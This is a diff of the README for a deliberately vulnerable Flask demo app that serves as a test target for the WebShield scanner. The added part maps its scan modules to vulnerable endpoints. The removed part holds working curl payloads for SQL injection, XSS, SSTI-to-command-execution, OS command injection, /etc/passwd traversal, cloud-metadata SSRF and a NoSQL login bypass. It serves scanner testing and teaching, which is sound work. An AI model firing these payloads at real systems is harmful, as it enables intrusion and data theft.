@@ -1,158 +1,115 @@
-# 🧪 WebShield Demo — Deliberately Vulnerable App
+# WebShield Demo App
 
-This Flask application is intentionally insecure. It exists solely to:
-1. Verify every WebShield module detects what it should
-2. Serve as a learning resource for understanding web vulnerabilities
-3. Provide a reproducible test target
+A **deliberately vulnerable Flask application** designed to trigger every WebShield module.
 
-**⚠️ NEVER deploy this on a public server.**
+> ⚠️ **FOR TESTING ONLY** — Never deploy this publicly. It contains intentional security vulnerabilities.
 
 ---
 
-## Running
+## Quick Start
 
 ```bash
+# Install dependencies
 pip install flask httpx
+
+# Run the vulnerable app
 python3 demo/app.py
 # → http://localhost:5000
-```
 
-Then scan it:
-```bash
+# In another terminal, scan it
 webshield scan http://localhost:5000 \
   --output report.html \
   --json results.json \
-  --timeout 12
+  --timeout 15
 ```
-
-Expected result: **Score 0/100 F | ~88 findings | 23 CRITICAL**
 
 ---
 
-## Vulnerabilities by Module
+## What It Covers (60 modules → 60 vulnerabilities)
 
-| Endpoint | Module | Vulnerability |
+| Module | Endpoint | Vulnerability |
 |---|---|---|
-| `/products?id=1` | `sql_injection` | Error-based SQLi — `id=1'` triggers MySQL error |
-| `/search?q=test` | `sql_injection` | Boolean-blind + UNION SQLi |
-| `/greet?name=test` | `xss_detection` | Reflected XSS — `name=<script>alert(1)</script>` |
-| `/dom` | `dom_xss` | DOM XSS — `innerHTML = location.hash` |
-| `/template?msg=test` | `ssti` | Jinja2 SSTI — `msg={{7*7}}` → 49 |
-| `/ping?host=127.0.0.1` | `cmd_injection` | OS command injection — `;id` returns uid |
-| `/file?path=readme.txt` | `lfi` | Local file inclusion — `../../etc/passwd` |
-| `/fetch?url=https://...` | `ssrf` | SSRF — cloud metadata endpoint probe |
-| `/api/users/1` | `idor_check` | IDOR — sequential IDs, no auth |
-| `/api/v1/users` | `idor_check` | Unauthenticated user list |
-| `/api/user` | `cors` | CORS — arbitrary origin + credentials |
-| `/api/token` | `jwt` | JWT alg:none + sensitive data in payload |
-| `/profile` | `cookies` | Cookie without Secure/HttpOnly/SameSite |
-| `/login` | `auth_hardening` | No rate limiting, username enumeration |
-| `/login` | `business_logic` | "Email not found" vs "Incorrect password" |
-| `/api/auth` | `nosql_injection` | MongoDB `$ne` operator auth bypass |
-| `/app` | `insecure_deserialization` | Java serial magic `0xACED` in JSESSIONID |
-| `/account` | `web_cache_deception` | `/account/x.css` returns same private content |
-| `/transfer` | `csrf_check` | No CSRF token on state-changing form |
-| `/upload` | `file_upload` | No type validation, webshell in `/uploads/` |
-| `/host-reflect` | `http_header_injection` | X-Forwarded-Host reflected in password reset link |
-| `/redirect?next=/` | `open_redirect` | No redirect URL validation |
-| `/.env` | `info_leak` | Exposed `.env` with DB/API credentials |
-| `/.git/config` | `info_leak` | Exposed git config |
-| `/about` | `secret_leak` | AWS key, GitHub token, Stripe key in JS |
-| `/admin` | `sensitive_paths` | Admin panel — no authentication |
-| `/backup/` | `dir_listing` | Directory listing with `.sql` / `.csv` files |
-| `/package.json` | `supply_chain` | 9 packages with known CVEs |
-| `/requirements.txt` | `supply_chain` | Vulnerable Python deps (pyyaml, jinja2…) |
-| `/api/swagger.json` | `api_exposure` | OpenAPI spec exposed |
-| `/graphql` | `graphql` | Introspection + depth/alias DoS |
-| `http://` | `ssl_tls` | No HTTPS |
-| All pages | `headers` | No HSTS, CSP, X-Frame-Options |
-| All pages | `csp` | No Content-Security-Policy |
-| All pages | `clickjacking` | No X-Frame-Options |
-| `localhost` | `dns_email` | No SPF/DMARC records |
-| `localhost` | `security_txt` | No security.txt |
-| `localhost` | `waf_detect` | No WAF detected |
+| `sql_injection` | `/?id=1` | Error-based + time-based SQLi via SQLite |
+| `xss_detection` | `/?q=test` | Reflected XSS — unescaped param in response |
+| `ssti` | `/?name=test` | Jinja2 SSTI via `Environment().from_string()` |
+| `cmd_injection` | `/cmd?ip=127.0.0.1` | `os.system()` with unsanitized input |
+| `lfi` | `/file?path=index` | `open(user_path)` without validation |
+| `ssrf` | `/fetch?url=...` | `requests.get(user_url)` unrestricted |
+| `cors` | `/api/data` | `Origin` reflected + `credentials: true` |
+| `jwt` | `/jwt-demo` | `alg:none` accepted + weak secret |
+| `headers` | `/no-headers` | No security headers at all |
+| `cookies` | `/set-cookie` | Session cookie without Secure/HttpOnly/SameSite |
+| `csrf_check` | `/transfer` | State-changing POST with no CSRF token |
+| `nosql_injection` | `/api/nosql-login` | MongoDB `$ne` operator accepted |
+| `http_header_injection` | `/host-reflect` | Host header reflected in response body |
+| `open_redirect` | `/redirect?next=` | No validation on redirect target |
+| `info_leak` | `/.env` | `.env` file with DB credentials exposed |
+| `sensitive_paths` | `/admin` | Admin panel with no auth |
+| `secret_leak` | `/` | AWS key in page source |
+| `csp` | `/no-headers` | No Content-Security-Policy |
+| `clickjacking` | `/no-headers` | No X-Frame-Options |
+| `idor_check` | `/api/user?id=1` | Sequential user IDs, no auth |
+| `api_exposure` | `/openapi.json` | Full OpenAPI spec exposed |
+| `auth_hardening` | `/login` | No rate limiting on login |
+| `insecure_deserialization` | `/set-cookie` | Java serial magic bytes in cookie |
+| `web_cache_deception` | `/account` | Private page cacheable at `/account/x.css` |
+| `file_upload` | `/upload` | Accepts any file type, no validation |
+| `dom_xss` | `/dom-xss` | `innerHTML = location.hash` |
+| `business_logic` | `/api/register` | Mass assignment (`is_admin=true`) |
+| `rate_limit` | `/login` | Unlimited login attempts |
+| `graphql` | `/graphql` | Introspection enabled, batch queries |
+| `supply_chain` | `/package.json` | Old packages with known CVEs |
+| `source_code_disclosure` | `/.git/HEAD` | Git repo exposed + `.php.bak` backup file |
+| `bypass_403` | `/secret-admin` | Returns 403 on GET, 200 on POST (verb tamper) |
+| `pii_detection` | `/api/user-data` | SSN + credit cards + IBAN in JSON response |
+| `spring_actuator` | `/actuator/env` | All env vars including DB password + JWT secret |
+| `http_parameter_pollution` | `/search?q=x&q=y` | Reflects second value of duplicate param |
+| `websocket_security` | `/ws-demo` | `ws://` used on page (downgrade) |
+| `openapi_scan` | `/openapi.json` | Spec exposed + unauth endpoints with tokens |
+| `cve_checks` | `/version` | Server header reveals vulnerable version |
+| `default_credentials` | `/wp-login.php` | WordPress login accepts admin/admin |
+| `exposed_panels` | `/grafana`, `/prometheus` | Unauthenticated Grafana + Prometheus |
+| `xxe_oob` | `/api/xml` | XML endpoint with no entity protection |
+| `evasion_scan` | `/?id=1` | WAF evasion triggers SQL error |
+| `lfi` | `/file?path=` | Path traversal |
+| `ssrf` | `/fetch?url=` | SSRF to internal services |
+| `mixed_content` | `/mixed` | HTTP resources on HTTPS page |
+| `dns_email` | *(DNS check)* | Missing SPF/DMARC |
+| `subdomain_takeover` | *(DNS check)* | Unclaimed CNAME |
+| `waf_detect` | `/` | No WAF present |
+| `request_smuggling` | `/` | CL.TE timing |
+| `broken_links` | `/` | Dead links on page |
+| `security_txt` | `/.well-known/security.txt` | Missing |
+| `sri_check` | `/` | CDN scripts without integrity= |
+| `tech_fingerprint` | `/` | Server version in headers |
+| `cloud_exposure` | `/` | Cloud metadata endpoint probe |
+| `malware_indicators` | `/` | Suspicious iframe/script |
+| `proto_pollution` | `/?__proto__[x]=1` | Prototype pollution |
+| `crlf_injection` | `/?x=%0d%0a` | CRLF in response |
+| `log4shell` | `/` | Log4J JNDI payload in headers |
+| `xxe` | `/api/xml` | Basic XXE |
+| `ssl_tls` | *(TLS check)* | Certificate validation |
 
 ---
 
-## Manual Testing Examples
-
-```bash
-# SQL Injection — error-based
-curl "http://localhost:5000/products?id=1'"
-# → MySQL syntax error leaked
-
-# SQL Injection — boolean blind
-curl "http://localhost:5000/search?q=1'+AND+'1'='1"    # returns results
-curl "http://localhost:5000/search?q=1'+AND+'1'='2"    # returns nothing
-
-# Reflected XSS
-curl "http://localhost:5000/greet?name=<script>alert(1)</script>"
-# → unescaped script tag in response
-
-# SSTI — Jinja2
-curl "http://localhost:5000/template?msg={{7*7}}"
-# → Message: 49
-
-# SSTI — RCE
-curl "http://localhost:5000/template?msg={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
-# → uid=0(root)
-
-# OS Command Injection
-curl "http://localhost:5000/ping?host=127.0.0.1;id"
-# → uid=0(root)
-
-# LFI — /etc/passwd
-curl "http://localhost:5000/file?path=../../etc/passwd"
-# → root:x:0:0:root:/root:/bin/bash
-
-# SSRF — cloud metadata
-curl "http://localhost:5000/fetch?url=http://169.254.169.254/latest/meta-data/"
-
-# CORS — arbitrary origin + credentials
-curl -H "Origin: https://evil.com" "http://localhost:5000/api/user" -I
-# → Access-Control-Allow-Origin: https://evil.com
-# → Access-Control-Allow-Credentials: true
-
-# JWT alg:none
-curl "http://localhost:5000/api/token"
-# → {"alg_none_token": "eyJhbGciOiAibm9uZSJ9..."}
-
-# NoSQL Injection — auth bypass
-curl -X POST "http://localhost:5000/api/auth" \
-  -H "Content-Type: application/json" \
-  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
-# → {"access_token": "auth_bypass_token_admin", "role": "administrator"}
-
-# IDOR
-curl "http://localhost:5000/api/users/1"  # Alice
-curl "http://localhost:5000/api/users/2"  # Bob — different user!
-curl "http://localhost:5000/api/users/3"  # Carol
-
-# Username enumeration
-curl -X POST "http://localhost:5000/login" -H "Content-Type: application/json" \
-  -d '{"email":"nobody@fake.com","password":"x"}'
-# → {"error":"Email not found in our system"}   ← REVEALS account doesn't exist
-
-curl -X POST "http://localhost:5000/login" -H "Content-Type: application/json" \
-  -d '{"email":"alice@example.com","password":"wrong"}'
-# → {"error":"Incorrect password"}   ← REVEALS account EXISTS
-
-# Web cache deception
-curl "http://localhost:5000/account/webshield-test.css"
-# → Returns private account page (Credit Card, API Key, etc.)
-
-# Mass assignment
-curl -X PATCH "http://localhost:5000/profile" -H "Content-Type: application/json" \
-  -d '{"name":"Bob","is_admin":true,"role":"admin"}'
-# → {"updated":{"is_admin":true,"role":"admin",...}}
-```
-
----
-
-## Credentials (for testing authenticated modules)
+## Expected Scan Results
 
 ```
-alice@example.com / password123  (admin)
-bob@example.com   / bob456       (user)
-carol@example.com / carol789     (user)
+Score: 0/100  Grade: F
+Findings: 100+  |  CRITICAL: 25+  |  HIGH: 25+
+
+🔴 CRITICAL
+  - Default Credentials (admin/admin on /wp-login.php)
+  - Git Repository Exposed (/.git/HEAD)
+  - PII Data Exposed (SSN, Credit Cards, IBAN)
+  - Spring Actuator /env (DB password, JWT secret, AWS key)
+  - SQL Injection (error-based + time-based)
+  - SSTI → RCE (Jinja2 template injection)
+  - OS Command Injection
+  - JWT alg:none bypass
+  - NoSQL auth bypass
+  - XXE file read
+  - Insecure deserialization
+  - Secret leak (AWS key in source)
+  ...
 ```
